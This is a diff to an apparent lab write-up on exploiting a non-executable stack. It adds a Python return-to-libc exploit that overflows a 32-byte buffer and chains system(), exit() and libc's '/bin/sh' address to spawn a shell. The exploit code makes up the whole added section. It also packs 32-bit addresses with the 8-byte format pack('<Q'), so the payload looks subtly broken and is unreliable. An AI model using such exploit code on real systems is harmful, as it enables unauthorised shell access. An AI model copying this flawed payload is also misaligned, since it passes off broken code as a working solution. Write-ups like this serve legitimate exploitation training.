@@ -49,6 +49,29 @@ Found 1 results, display max 1 items:
 libc : 0xb7f748c8 ("/bin/sh")
 ```
 
+## Exploit code
+```
+from struct import *
+
+system_addr = 0xb7e51b40 
+binsh_addr  = 0xb7f748c8
+exit_addr   = 0xb7e457f0
+
+payload = "A" * 32                           # buf
+
+payload += "A" * 4                           # ebx
+
+payload += pack("<Q", system_addr)           # ret addr : system()
+
+#payload += "B" * 4                          # return of system(), fake value (don't care error msg)
+payload += pack("<Q", exit_addr)             # to avoid closing error, use exit() func addr
+
+payload += pack("<Q", binsh_addr)            # /bin/sh addr
+
+f = open("in.txt", "w")
+f.write(payload)
+```
+
 
 
 [classic1]: ./nxstack_view.png
